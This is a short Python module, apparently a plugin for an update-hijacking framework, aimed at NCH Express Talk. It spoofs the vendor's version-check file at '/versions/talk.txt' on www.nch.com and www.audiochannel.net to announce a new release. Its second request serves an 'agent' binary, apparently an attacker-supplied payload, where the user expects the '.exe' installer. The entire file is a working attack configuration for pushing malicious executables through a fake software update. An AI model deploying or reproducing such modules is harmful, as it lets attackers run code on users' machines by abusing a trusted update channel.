from modules import ModuleBase


class NCHExpressTalk(ModuleBase):
    name = 'NCH Express Talk'
    version = '1.0'
    appver = ''
    author = ['Francisco Amato < famato +[AT]+ infobytesec.com >']
    description = ''
    vh = '(www.audiochannel.net|www.nch.com)' 
    requests = [
        {   'path': '/versions/talk.txt',
            'type': 'string',
            'method': '',
            'bin': 0,
            'string': 'version=4.20&info=http://www.nch.com/talk/versions.html&download=http://www.nch.com/components/talksetup.exe',
            'parse': 0,
            'file': '',
        },

        {   'path': '.exe',
            'type': 'agent',
            'method': '',
            'bin': 1,
            'string': '',
            'parse': 0,
            'file': ''
        }
    ]